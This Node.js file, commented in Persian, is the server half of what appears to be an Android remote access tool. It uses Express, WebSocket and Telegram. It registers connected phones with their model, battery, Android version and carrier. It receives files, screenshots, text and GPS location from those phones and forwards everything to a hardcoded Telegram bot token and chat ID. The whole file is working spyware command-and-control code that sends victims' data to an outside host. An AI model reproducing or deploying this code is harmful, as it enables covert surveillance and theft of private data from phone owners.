
// index.js – نسخه کامل ترکیبی از سرور Express + WebSocket + Telegram Bot

const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// اطلاعات کاربر
const token = '5899483276:AAGtvLrO_fpCz_2rWqPnxShRCWV2Wc2kOK8';
const id = '6185981200';
const address = 'https://www.google.com';

// راه‌اندازی سرور
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">Server uploaded successfully</h1>');
});

// آپلود فایل به تلگرام
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `File from <b>${req.headers.model}</b>`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: 'application/txt',
    });
    res.send('');
});

// آپلود اسکرین‌شات
app.post("/uploadScreenshot", upload.single('screenshot'), (req, res) => {
    appBot.sendPhoto(id, req.file.buffer, {
        caption: `Screenshot from <b>${req.headers.model}</b>`,
        parse_mode: "HTML"
    });
    res.send('');
});

// آپلود متن
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `Message from <b>${req.headers.model}</b>

${req.body['text']}`, { parse_mode: "HTML" });
    res.send('');
});

// آپلود موقعیت مکانی
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `Location from <b>${req.headers.model}</b>`, { parse_mode: "HTML" });
    res.send('');
});

// اتصال WebSocket
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;

    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider });

    appBot.sendMessage(id,
        `New device connected

Model: <b>${model}</b>
Battery: <b>${battery}</b>
Android: <b>${version}</b>
Brightness: <b>${brightness}</b>
Provider: <b>${provider}</b>`,
        { parse_mode: "HTML" }
    );

    ws.on('close', () => {
        appClients.delete(ws.uuid);
        appBot.sendMessage(id,
            `Device disconnected

Model: <b>${model}</b>
Battery: <b>${battery}</b>
Android: <b>${version}</b>
Brightness: <b>${brightness}</b>
Provider: <b>${provider}</b>`,
            { parse_mode: "HTML" }
        );
    });
});

// پینگ سرور و زنده نگه‌داشتن آن
setInterval(() => {
    appSocket.clients.forEach(ws => {
        ws.send('ping');
    });
    try {
        axios.get(address).then(() => {});
    } catch (e) {}
}, 5000);

// شروع سرور
appServer.listen(process.env.PORT || 8999, () => {
    console.log("Server is running...");
});

// باقی کدهای مربوط به appBot.on('message') و callback_query و مدیریت دستورات دستگاه‌ها
// را می‌توان در فایل‌های مجزا مثل commands.js و callbacks.js ساخت و در اینجا require کرد.
